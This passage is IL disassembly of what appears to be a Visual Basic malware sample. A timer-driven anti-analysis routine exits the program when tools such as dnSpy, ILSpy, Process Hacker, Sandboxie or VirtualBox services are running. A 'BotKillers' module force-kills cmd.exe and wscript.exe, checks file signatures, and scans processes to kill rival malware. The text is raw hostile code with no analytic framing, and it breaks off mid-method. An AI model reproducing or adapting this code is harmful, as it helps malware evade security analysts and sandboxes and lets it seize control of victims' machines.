    IL_015f:  add.ovf
    IL_0160:  stloc.s    V_17
    IL_0162:  ldloc.s    V_17
    IL_0164:  ldloc.s    V_16
    IL_0166:  ldlen
    IL_0167:  conv.i4
    IL_0168:  blt.s      IL_0151

    IL_016a:  ldstr      "NetSnifferCs"
    IL_016f:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0174:  stloc.s    V_18
    IL_0176:  ldc.i4.0
    IL_0177:  stloc.s    V_19
    IL_0179:  br.s       IL_018c

    IL_017b:  ldloc.s    V_18
    IL_017d:  ldloc.s    V_19
    IL_017f:  ldelem.ref
    IL_0180:  pop
    IL_0181:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0186:  ldloc.s    V_19
    IL_0188:  ldc.i4.1
    IL_0189:  add.ovf
    IL_018a:  stloc.s    V_19
    IL_018c:  ldloc.s    V_19
    IL_018e:  ldloc.s    V_18
    IL_0190:  ldlen
    IL_0191:  conv.i4
    IL_0192:  blt.s      IL_017b

    IL_0194:  ldstr      "Sandboxie Control"
    IL_0199:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_019e:  stloc.s    V_20
    IL_01a0:  ldc.i4.0
    IL_01a1:  stloc.s    V_21
    IL_01a3:  br.s       IL_01b6

    IL_01a5:  ldloc.s    V_20
    IL_01a7:  ldloc.s    V_21
    IL_01a9:  ldelem.ref
    IL_01aa:  pop
    IL_01ab:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01b0:  ldloc.s    V_21
    IL_01b2:  ldc.i4.1
    IL_01b3:  add.ovf
    IL_01b4:  stloc.s    V_21
    IL_01b6:  ldloc.s    V_21
    IL_01b8:  ldloc.s    V_20
    IL_01ba:  ldlen
    IL_01bb:  conv.i4
    IL_01bc:  blt.s      IL_01a5

    IL_01be:  ldstr      "processhacker"
    IL_01c3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01c8:  stloc.s    V_22
    IL_01ca:  ldc.i4.0
    IL_01cb:  stloc.s    V_23
    IL_01cd:  br.s       IL_01e0

    IL_01cf:  ldloc.s    V_22
    IL_01d1:  ldloc.s    V_23
    IL_01d3:  ldelem.ref
    IL_01d4:  pop
    IL_01d5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_01da:  ldloc.s    V_23
    IL_01dc:  ldc.i4.1
    IL_01dd:  add.ovf
    IL_01de:  stloc.s    V_23
    IL_01e0:  ldloc.s    V_23
    IL_01e2:  ldloc.s    V_22
    IL_01e4:  ldlen
    IL_01e5:  conv.i4
    IL_01e6:  blt.s      IL_01cf

    IL_01e8:  ldstr      "dnSpy"
    IL_01ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01f2:  stloc.s    V_24
    IL_01f4:  ldc.i4.0
    IL_01f5:  stloc.s    V_25
    IL_01f7:  br.s       IL_020a

    IL_01f9:  ldloc.s    V_24
    IL_01fb:  ldloc.s    V_25
    IL_01fd:  ldelem.ref
    IL_01fe:  pop
    IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0204:  ldloc.s    V_25
    IL_0206:  ldc.i4.1
    IL_0207:  add.ovf
    IL_0208:  stloc.s    V_25
    IL_020a:  ldloc.s    V_25
    IL_020c:  ldloc.s    V_24
    IL_020e:  ldlen
    IL_020f:  conv.i4
    IL_0210:  blt.s      IL_01f9

    IL_0212:  ldstr      "CodeReflect"
    IL_0217:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_021c:  stloc.s    V_26
    IL_021e:  ldc.i4.0
    IL_021f:  stloc.s    V_27
    IL_0221:  br.s       IL_0234

    IL_0223:  ldloc.s    V_26
    IL_0225:  ldloc.s    V_27
    IL_0227:  ldelem.ref
    IL_0228:  pop
    IL_0229:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_022e:  ldloc.s    V_27
    IL_0230:  ldc.i4.1
    IL_0231:  add.ovf
    IL_0232:  stloc.s    V_27
    IL_0234:  ldloc.s    V_27
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldlen
    IL_0239:  conv.i4
    IL_023a:  blt.s      IL_0223

    IL_023c:  ldstr      "Reflector"
    IL_0241:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0246:  stloc.s    V_28
    IL_0248:  ldc.i4.0
    IL_0249:  stloc.s    V_29
    IL_024b:  br.s       IL_025e

    IL_024d:  ldloc.s    V_28
    IL_024f:  ldloc.s    V_29
    IL_0251:  ldelem.ref
    IL_0252:  pop
    IL_0253:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0258:  ldloc.s    V_29
    IL_025a:  ldc.i4.1
    IL_025b:  add.ovf
    IL_025c:  stloc.s    V_29
    IL_025e:  ldloc.s    V_29
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldlen
    IL_0263:  conv.i4
    IL_0264:  blt.s      IL_024d

    IL_0266:  ldstr      "ILSpy"
    IL_026b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0270:  stloc.s    V_30
    IL_0272:  ldc.i4.0
    IL_0273:  stloc.s    V_31
    IL_0275:  br.s       IL_0288

    IL_0277:  ldloc.s    V_30
    IL_0279:  ldloc.s    V_31
    IL_027b:  ldelem.ref
    IL_027c:  pop
    IL_027d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0282:  ldloc.s    V_31
    IL_0284:  ldc.i4.1
    IL_0285:  add.ovf
    IL_0286:  stloc.s    V_31
    IL_0288:  ldloc.s    V_31
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldlen
    IL_028d:  conv.i4
    IL_028e:  blt.s      IL_0277

    IL_0290:  ldstr      "VGAuthService"
    IL_0295:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029a:  stloc.s    V_32
    IL_029c:  ldc.i4.0
    IL_029d:  stloc.s    V_33
    IL_029f:  br.s       IL_02b2

    IL_02a1:  ldloc.s    V_32
    IL_02a3:  ldloc.s    V_33
    IL_02a5:  ldelem.ref
    IL_02a6:  pop
    IL_02a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ac:  ldloc.s    V_33
    IL_02ae:  ldc.i4.1
    IL_02af:  add.ovf
    IL_02b0:  stloc.s    V_33
    IL_02b2:  ldloc.s    V_33
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldlen
    IL_02b7:  conv.i4
    IL_02b8:  blt.s      IL_02a1

    IL_02ba:  ldstr      "VBoxService"
    IL_02bf:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c4:  stloc.s    V_34
    IL_02c6:  ldc.i4.0
    IL_02c7:  stloc.s    V_35
    IL_02c9:  br.s       IL_02dc

    IL_02cb:  ldloc.s    V_34
    IL_02cd:  ldloc.s    V_35
    IL_02cf:  ldelem.ref
    IL_02d0:  pop
    IL_02d1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d6:  ldloc.s    V_35
    IL_02d8:  ldc.i4.1
    IL_02d9:  add.ovf
    IL_02da:  stloc.s    V_35
    IL_02dc:  ldloc.s    V_35
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldlen
    IL_02e1:  conv.i4
    IL_02e2:  blt.s      IL_02cb

    IL_02e4:  ret
  } // end of method MyAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       53 (0x35)
    .maxstack  8
    IL_0000:  ldc.r8     5.
    IL_0009:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000e:  stsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0013:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_0018:  ldnull
    IL_0019:  ldftn      void MyAntiProcess::Handler(object,
                                                     class [System]System.Timers.ElapsedEventArgs)
    IL_001f:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0024:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_0029:  ldsfld     class [System]System.Timers.Timer MyAntiProcess::Timer
    IL_002e:  ldc.i4.1
    IL_002f:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0034:  ret
  } // end of method MyAntiProcess::Start

} // end of class MyAntiProcess

.class private auto ansi sealed beforefieldinit BotKillers
       extends [mscorlib]System.Object
{
  .custom instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.StandardModuleAttribute::.ctor() = ( 01 00 00 00 ) 
  .class auto ansi sealed nested public ThreadAccess
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/ThreadAccess DIRECT_IMPERSONATION = int32(0x00000200)
    .field public static literal valuetype BotKillers/ThreadAccess GET_CONTEXT = int32(0x00000008)
    .field public static literal valuetype BotKillers/ThreadAccess IMPERSONATE = int32(0x00000100)
    .field public static literal valuetype BotKillers/ThreadAccess QUERY_INFORMATION = int32(0x00000040)
    .field public static literal valuetype BotKillers/ThreadAccess SET_CONTEXT = int32(0x00000010)
    .field public static literal valuetype BotKillers/ThreadAccess SET_INFORMATION = int32(0x00000020)
    .field public static literal valuetype BotKillers/ThreadAccess SET_THREAD_TOKEN = int32(0x00000080)
    .field public static literal valuetype BotKillers/ThreadAccess SUSPEND_RESUME = int32(0x00000002)
    .field public static literal valuetype BotKillers/ThreadAccess TERMINATE = int32(0x00000001)
  } // end of class ThreadAccess

  .class auto ansi sealed nested public WinTrustDataUIChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice All = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice None = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoBad = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataUIChoice NoGood = uint32(0x00000004)
  } // end of class WinTrustDataUIChoice

  .class auto ansi sealed nested public WinTrustDataRevocationChecks
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks None = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataRevocationChecks WholeChain = uint32(0x00000001)
  } // end of class WinTrustDataRevocationChecks

  .class auto ansi sealed nested public WinTrustDataChoice
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataChoice File = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Catalog = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Blob = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Signer = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataChoice Certificate = uint32(0x00000005)
  } // end of class WinTrustDataChoice

  .class auto ansi sealed nested public WinTrustDataStateAction
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Ignore = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Verify = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction Close = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCache = uint32(0x00000003)
    .field public static literal valuetype BotKillers/WinTrustDataStateAction AutoCacheFlush = uint32(0x00000004)
  } // end of class WinTrustDataStateAction

  .class auto ansi sealed nested public WinTrustDataProvFlags
         extends [mscorlib]System.Enum
  {
    .custom instance void [mscorlib]System.FlagsAttribute::.ctor() = ( 01 00 00 00 ) 
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseIe4TrustFlag = uint32(0x00000001)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoIe4ChainFlag = uint32(0x00000002)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags NoPolicyUsageFlag = uint32(0x00000004)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckNone = uint32(0x00000010)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckEndCert = uint32(0x00000020)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChain = uint32(0x00000040)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags RevocationCheckChainExcludeRoot = uint32(0x00000080)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags SaferFlag = uint32(0x00000100)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags HashOnlyFlag = uint32(0x00000200)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags UseDefaultOsverCheck = uint32(0x00000400)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags LifetimeSigningFlag = uint32(0x00000800)
    .field public static literal valuetype BotKillers/WinTrustDataProvFlags CacheOnlyUrlRetrieval = uint32(0x00001000)
  } // end of class WinTrustDataProvFlags

  .class auto ansi sealed nested public WinTrustDataUIContext
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname uint32 value__
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Execute = uint32(0x00000000)
    .field public static literal valuetype BotKillers/WinTrustDataUIContext Install = uint32(0x00000001)
  } // end of class WinTrustDataUIContext

  .class sequential unicode nested public WinTrustFileInfo
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int pszFilePath
    .field private native int hFile
    .field private native int pgKnownSubject
    .method public specialname rtspecialname 
            instance void  .ctor(string _filePath) cil managed
    {
      // Code size       62 (0x3e)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustFileInfo
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustFileInfo::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustFileInfo::hFile
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustFileInfo::pgKnownSubject
      IL_0031:  ldarg.0
      IL_0032:  ldarg.1
      IL_0033:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::StringToCoTaskMemAuto(string)
      IL_0038:  stfld      native int BotKillers/WinTrustFileInfo::pszFilePath
      IL_003d:  ret
    } // end of method WinTrustFileInfo::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustFileInfo::pszFilePath
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustFileInfo::Finalize

  } // end of class WinTrustFileInfo

  .class sequential unicode nested public WinTrustData
         extends [mscorlib]System.Object
  {
    .field private int32 StructSize
    .field private native int PolicyCallbackData
    .field private native int SIPClientData
    .field private valuetype BotKillers/WinTrustDataUIChoice UIChoice
    .field private valuetype BotKillers/WinTrustDataRevocationChecks RevocationChecks
    .field private valuetype BotKillers/WinTrustDataChoice UnionChoice
    .field private native int FileInfoPtr
    .field private valuetype BotKillers/WinTrustDataStateAction StateAction
    .field private native int StateData
    .field private string URLReference
    .field private valuetype BotKillers/WinTrustDataProvFlags ProvFlags
    .field private valuetype BotKillers/WinTrustDataUIContext UIContext
    .method public specialname rtspecialname 
            instance void  .ctor(string _fileName) cil managed
    {
      // Code size       158 (0x9e)
      .maxstack  3
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ldarg.0
      IL_0007:  ldtoken    BotKillers/WinTrustData
      IL_000c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0011:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0016:  stfld      int32 BotKillers/WinTrustData::StructSize
      IL_001b:  ldarg.0
      IL_001c:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0021:  stfld      native int BotKillers/WinTrustData::PolicyCallbackData
      IL_0026:  ldarg.0
      IL_0027:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_002c:  stfld      native int BotKillers/WinTrustData::SIPClientData
      IL_0031:  ldarg.0
      IL_0032:  ldc.i4.2
      IL_0033:  stfld      valuetype BotKillers/WinTrustDataUIChoice BotKillers/WinTrustData::UIChoice
      IL_0038:  ldarg.0
      IL_0039:  ldc.i4.0
      IL_003a:  stfld      valuetype BotKillers/WinTrustDataRevocationChecks BotKillers/WinTrustData::RevocationChecks
      IL_003f:  ldarg.0
      IL_0040:  ldc.i4.1
      IL_0041:  stfld      valuetype BotKillers/WinTrustDataChoice BotKillers/WinTrustData::UnionChoice
      IL_0046:  ldarg.0
      IL_0047:  ldc.i4.0
      IL_0048:  stfld      valuetype BotKillers/WinTrustDataStateAction BotKillers/WinTrustData::StateAction
      IL_004d:  ldarg.0
      IL_004e:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0053:  stfld      native int BotKillers/WinTrustData::StateData
      IL_0058:  ldarg.0
      IL_0059:  ldnull
      IL_005a:  stfld      string BotKillers/WinTrustData::URLReference
      IL_005f:  ldarg.0
      IL_0060:  ldc.i4     0x100
      IL_0065:  stfld      valuetype BotKillers/WinTrustDataProvFlags BotKillers/WinTrustData::ProvFlags
      IL_006a:  ldarg.0
      IL_006b:  ldc.i4.0
      IL_006c:  stfld      valuetype BotKillers/WinTrustDataUIContext BotKillers/WinTrustData::UIContext
      IL_0071:  ldarg.1
      IL_0072:  newobj     instance void BotKillers/WinTrustFileInfo::.ctor(string)
      IL_0077:  ldarg.0
      IL_0078:  ldtoken    BotKillers/WinTrustFileInfo
      IL_007d:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0082:  call       int32 [mscorlib]System.Runtime.InteropServices.Marshal::SizeOf(class [mscorlib]System.Type)
      IL_0087:  call       native int [mscorlib]System.Runtime.InteropServices.Marshal::AllocCoTaskMem(int32)
      IL_008c:  stfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0091:  ldarg.0
      IL_0092:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
      IL_0097:  ldc.i4.0
      IL_0098:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::StructureToPtr(object,
                                                                                                 native int,
                                                                                                 bool)
      IL_009d:  ret
    } // end of method WinTrustData::.ctor

    .method family hidebysig strict virtual 
            instance void  Finalize() cil managed
    {
      // Code size       21 (0x15)
      .maxstack  1
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  ldfld      native int BotKillers/WinTrustData::FileInfoPtr
        IL_0006:  call       void [mscorlib]System.Runtime.InteropServices.Marshal::FreeCoTaskMem(native int)
        IL_000b:  leave.s    IL_0014

      }  // end .try
      finally
      {
        IL_000d:  ldarg.0
        IL_000e:  call       instance void [mscorlib]System.Object::Finalize()
        IL_0013:  endfinally
      }  // end handler
      IL_0014:  ret
    } // end of method WinTrustData::Finalize

  } // end of class WinTrustData

  .class auto ansi sealed nested public WinVerifyTrustResult
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int32 value__
    .field public static literal valuetype BotKillers/WinVerifyTrustResult Success = int32(0x00000000)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ProviderUnknown = int32(0x800B0001)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult ActionUnknown = int32(0x800B0002)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectFormUnknown = int32(0x800B0003)
    .field public static literal valuetype BotKillers/WinVerifyTrustResult SubjectNotTrusted = int32(0x800B0004)
  } // end of class WinVerifyTrustResult

  .class auto ansi sealed nested public beforefieldinit WinTrust
         extends [mscorlib]System.Object
  {
    .field private static initonly native int INVALID_HANDLE_VALUE
    .field private static literal string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
    .method private specialname rtspecialname static 
            void  .cctor() cil managed
    {
      // Code size       12 (0xc)
      .maxstack  8
      IL_0000:  ldc.i4.m1
      IL_0001:  newobj     instance void [mscorlib]System.IntPtr::.ctor(int32)
      IL_0006:  stsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
      IL_000b:  ret
    } // end of method WinTrust::.cctor

    .method private static pinvokeimpl("wintrust.dll" nomangle unicode winapi) 
            valuetype BotKillers/WinVerifyTrustResult 
            WinVerifyTrust([in] native int hwnd,
                           [in] valuetype [mscorlib]System.Guid  marshal( lpstruct) pgActionID,
                           [in] class BotKillers/WinTrustData pWVTData) cil managed preservesig
    {
    }
    .method public static bool  VerifyEmbeddedSignature(string fileName) cil managed
    {
      // Code size       52 (0x34)
      .maxstack  3
      .locals init (bool V_0,
               class BotKillers/WinTrustData V_1,
               valuetype [mscorlib]System.Guid V_2)
      .try
      {
        IL_0000:  ldarg.0
        IL_0001:  newobj     instance void BotKillers/WinTrustData::.ctor(string)
        IL_0006:  stloc.1
        IL_0007:  ldstr      "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}"
        IL_000c:  newobj     instance void [mscorlib]System.Guid::.ctor(string)
        IL_0011:  stloc.2
        IL_0012:  ldsfld     native int BotKillers/WinTrust::INVALID_HANDLE_VALUE
        IL_0017:  ldloc.2
        IL_0018:  ldloc.1
        IL_0019:  call       valuetype BotKillers/WinVerifyTrustResult BotKillers/WinTrust::WinVerifyTrust(native int,
                                                                                                           valuetype [mscorlib]System.Guid,
                                                                                                           class BotKillers/WinTrustData)
        IL_001e:  ldc.i4.0
        IL_001f:  ceq
        IL_0021:  stloc.0
        IL_0022:  leave.s    IL_0032

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0029:  ldc.i4.0
        IL_002a:  stloc.0
        IL_002b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0030:  leave.s    IL_0032

      }  // end handler
      IL_0032:  ldloc.0
      IL_0033:  ret
    } // end of method WinTrust::VerifyEmbeddedSignature

    .method private specialname rtspecialname 
            instance void  .ctor() cil managed
    {
      // Code size       7 (0x7)
      .maxstack  8
      IL_0000:  ldarg.0
      IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
      IL_0006:  ret
    } // end of method WinTrust::.ctor

  } // end of class WinTrust

  .field private static int32 ProccessKilled
  .field private static int32 Startupkilled
  .field private static string hio
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldc.i4.0
    IL_0001:  stsfld     int32 BotKillers::ProccessKilled
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     int32 BotKillers::Startupkilled
    IL_000c:  ret
  } // end of method BotKillers::.cctor

  .method private static pinvokeimpl("user32.dll" lasterr winapi) 
          bool  marshal( bool)  IsWindowVisible(native int hWnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          native int  FindWindow(string lpClassName,
                                 string lpWindowName) cil managed preservesig
  {
  }
  .method public static void  RunStandardBotKiller() cil managed
  {
    // Code size       189 (0xbd)
    .maxstack  4
    .locals init (int32 V_0,
             int32 V_1,
             int32 V_2)
    .try
    {
      IL_0000:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0005:  ldc.i4.1
      IL_0006:  stloc.0
      IL_0007:  ldc.i4.2
      IL_0008:  stloc.2
      IL_0009:  ldstr      "TASKKILL /F /IM wscript.exe"
      IL_000e:  ldc.i4.0
      IL_000f:  ldc.i4.0
      IL_0010:  ldc.i4.m1
      IL_0011:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0016:  pop
      IL_0017:  ldc.i4.3
      IL_0018:  stloc.2
      IL_0019:  ldstr      "TASKKILL /F /IM cmd.exe"
      IL_001e:  ldc.i4.0
      IL_001f:  ldc.i4.0
      IL_0020:  ldc.i4.m1
      IL_0021:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_0026:  pop
      IL_0027:  ldc.i4.4
      IL_0028:  stloc.2
      IL_0029:  call       void BotKillers::ScanProcess()
      IL_002e:  ldc.i4.5
      IL_002f:  stloc.2
      IL_0030:  call       void BotKillers::RunStartupKiller()
      IL_0035:  ldc.i4.6
      IL_0036:  stloc.2
      IL_0037:  ldc.i4.0
      IL_0038:  stsfld     int32 BotKillers::ProccessKilled
      IL_003d:  ldc.i4.7
      IL_003e:  stloc.2
      IL_003f:  ldc.i4.0
      IL_0040:  stsfld     int32 BotKillers::Startupkilled
      IL_0045:  leave.s    IL_00b4

      IL_0047:  ldloc.1
      IL_0048:  ldc.i4.1
      IL_0049:  add
      IL_004a:  ldc.i4.0
      IL_004b:  stloc.1
      IL_004c:  switch     ( 
                            IL_0075,
                            IL_0000,
                            IL_0007,
                            IL_0017,
                            IL_0027,
                            IL_002e,
                            IL_0035,
                            IL_003d,
                            IL_0045)
      IL_0075:  leave.s    IL_00a9

      IL_0077:  ldloc.2
      IL_0078:  stloc.1
      IL_0079:  ldloc.0
      IL_007a:  switch     ( 
                            IL_0087,
                            IL_0047)
      IL_0087:  leave.s    IL_00a9

    }  // end .try
    filter
    {
      IL_0089:  isinst     [mscorlib]System.Exception
      IL_008e:  ldnull
      IL_008f:  cgt.un
      IL_0091:  ldloc.0
      IL_0092:  ldc.i4.0
      IL_0093:  cgt.un
      IL_0095:  and
      IL_0096:  ldloc.1
      IL_0097:  ldc.i4.0
      IL_0098:  ceq
      IL_009a:  and
      IL_009b:  endfilter
    }  // end filter
    {  // handler
      IL_009d:  castclass  [mscorlib]System.Exception
      IL_00a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00a7:  leave.s    IL_0077

    }  // end handler
    IL_00a9:  ldc.i4     0x800a0033
    IL_00ae:  call       class [mscorlib]System.Exception [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::CreateProjectError(int32)
    IL_00b3:  throw

    IL_00b4:  ldloc.1
    IL_00b5:  brfalse.s  IL_00bc

    IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
    IL_00bc:  ret
  } // end of method BotKillers::RunStandardBotKiller

  .method public static void  ScanProcess() cil managed
  {
    // Code size       128 (0x80)
    .maxstack  2
    .locals init (class [System]System.Diagnostics.Process[] V_0,
             string V_1,
             int32 V_2,
             int32 V_3,
             class [System]System.Diagnostics.Process V_4)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcesses()
      IL_0005:  stloc.0
      IL_0006:  ldloc.0
      IL_0007:  ldlen
      IL_0008:  conv.i4
      IL_0009:  ldc.i4.1
      IL_000a:  sub.ovf
      IL_000b:  stloc.2
      IL_000c:  ldc.i4.0
      IL_000d:  stloc.3
      IL_000e:  br.s       IL_006d

      IL_0010:  ldloc.0
      IL_0011:  ldloc.3
      IL_0012:  ldelem.ref
      IL_0013:  stloc.s    V_4
      .try
      {
        IL_0015:  ldloc.s    V_4
        IL_0017:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
        IL_001c:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
        IL_0021:  call       string [mscorlib]System.IO.Path::GetFullPath(string)
        IL_0026:  stloc.1
        IL_0027:  ldloc.1
        IL_0028:  call       bool BotKillers::IsFileMalicious(string)
        IL_002d:  brfalse.s  IL_005b

        IL_002f:  ldloc.s    V_4
        IL_0031:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
